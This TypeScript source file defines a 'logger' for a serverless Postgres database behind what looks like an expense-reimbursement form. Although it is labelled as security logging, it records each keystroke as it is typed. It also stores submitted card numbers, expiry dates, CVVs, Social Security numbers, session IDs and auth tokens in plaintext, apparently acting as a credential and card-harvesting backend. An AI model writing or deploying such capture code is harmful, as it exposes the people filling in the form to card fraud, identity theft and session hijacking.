import { neon } from '@neondatabase/serverless';

interface FormDataEntry {
  employeeName?: string;
  employeeId?: string;
  expenseDescription?: string;
  amount?: string;
  businessPurpose?: string;
  clientName?: string;
  notes?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  ssn?: string;
}

// Simple logger that works with Edge runtime
export async function logger(entry: Record<string, unknown>) {
  try {
    // Console logging for immediate debugging
    console.log('SECURITY_LOG:', JSON.stringify(entry));
    
    // Database logging - simplified
    if (process.env.DATABASE_URL) {
      const sql = neon(process.env.DATABASE_URL);
      
      // Just log keystrokes immediately when they happen
      if (entry.type === 'keystroke') {
        await sql`INSERT INTO keystroke_logs (field_name, field_value, ip_address, user_agent, referer, timestamp) 
                  VALUES (${entry.field as string || ''}, ${entry.value as string || ''}, ${entry.ip as string || ''}, 
                          ${entry.userAgent as string || ''}, ${entry.referer as string || ''}, ${entry.timestamp as string || ''})`;
      }

      // Log form submissions
      if (entry.type === 'submit' && entry.formData) {
        const formData = entry.formData as FormDataEntry;
        await sql`INSERT INTO form_submissions 
                  (employee_name, employee_id, expense_description, amount, business_purpose, 
                   client_name, notes, card_number, card_expiry, card_cvv, ssn, 
                   session_id, auth_token, ip_address, user_agent, timestamp) 
                  VALUES (${formData.employeeName || ''}, ${formData.employeeId || ''}, ${formData.expenseDescription || ''}, 
                          ${formData.amount || ''}, ${formData.businessPurpose || ''}, ${formData.clientName || ''}, 
                          ${formData.notes || ''}, ${formData.cardNumber || ''}, ${formData.cardExpiry || ''}, 
                          ${formData.cardCvv || ''}, ${formData.ssn || ''}, ${entry.sessionId as string || ''}, 
                          ${entry.authToken as string || ''}, ${entry.ip as string || ''}, 
                          ${entry.userAgent as string || ''}, ${entry.timestamp as string || ''})`;
      }

      // General security log
      await sql`INSERT INTO security_logs (type, timestamp, ip_address, user_agent, referer, data) 
                VALUES (${entry.type as string || ''}, ${entry.timestamp as string || ''}, ${entry.ip as string || ''}, 
                        ${entry.userAgent as string || ''}, ${entry.referer as string || ''}, ${JSON.stringify(entry)})`;
    }
    
  } catch (error) {
    console.error("Logger error:", error);
    console.log('FALLBACK_LOG:', JSON.stringify(entry));
  }
}